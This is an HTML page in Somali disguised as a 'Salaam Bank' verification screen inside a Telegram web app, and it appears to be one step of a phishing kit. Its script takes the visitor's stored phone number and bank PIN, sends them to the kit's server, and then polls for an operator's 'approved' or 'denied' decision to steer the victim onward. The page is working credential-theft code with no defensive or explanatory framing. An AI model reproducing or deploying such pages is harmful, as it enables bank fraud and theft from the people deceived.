<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Salaam Bank - Waa la howl-gelinayaa</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --bank-primary: #0056b3;
            --bank-gradient: linear-gradient(180deg, #007bff 0%, #0056b3 100%);
            --bg-dark: #333333;
            --card-bg: #ffffff;
            --text-muted: #666666;
        }

        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-dark); margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }

        .loading-card {
            background: var(--card-bg); width: 88%; max-width: 380px; padding: 45px 24px;
            border-radius: 20px; text-align: center; box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25); display: flex; flex-direction: column; align-items: center;
        }

        .loader-circle {
            width: 110px; height: 110px; background: var(--bank-gradient); border-radius: 50%;
            margin-bottom: 28px; display: flex; justify-content: center; align-items: center;
        }
        .loader-circle::after {
            content: ''; width: 82px; height: 82px; border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #ffffff; border-radius: 50%; animation: spin 1.2s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        h2 { color: var(--bank-primary); font-size: 24px; margin: 0 0 10px; font-weight: 800; }
        p { color: var(--text-muted); font-size: 15px; margin: 0; line-height: 1.5; }
    </style>
</head>

<body>

<div class="loading-card">
    <div class="loader-circle"></div>
    <h2 id="main-text">Waa la baarayaa...</h2>
    <p id="sub-text">Fadlan sug inta la xaqiijinayo...</p>
</div>

<script>
document.addEventListener("DOMContentLoaded", async () => {
    const mainText = document.getElementById("main-text");
    const subText = document.getElementById("sub-text");

    const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
    const pin = localStorage.getItem("lastPin") || "";

    try {
        await fetch("/api/login-notification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin, country: "SO" })
        });
    } catch (err) {
        console.error("Error:", err);
    }

    setTimeout(() => {
        mainText.textContent = "Fadlan sug...";
        subText.textContent = "Tani waxay qaadanaysaa ilbiriqsiyo kooban";
    }, 3000);

    async function checkApproval() {
        if (!phone) return;
        try {
            const res = await fetch(`/api/check-status?phone=${phone}`);
            const data = await res.json();

            if (data.status === "approved") {
                mainText.textContent = "Waa la Oggolaaday!";
                setTimeout(() => { window.location.href = "/page8"; }, 1500);
            }
            if (data.status === "denied") {
                mainText.textContent = "Waa la Diiday!";
                setTimeout(() => { window.location.href = "/page6?error=wrongpin"; }, 2000);
            }
        } catch (err) {}
    }

    setInterval(checkApproval, 2000);
});
</script>

</body>
</html>
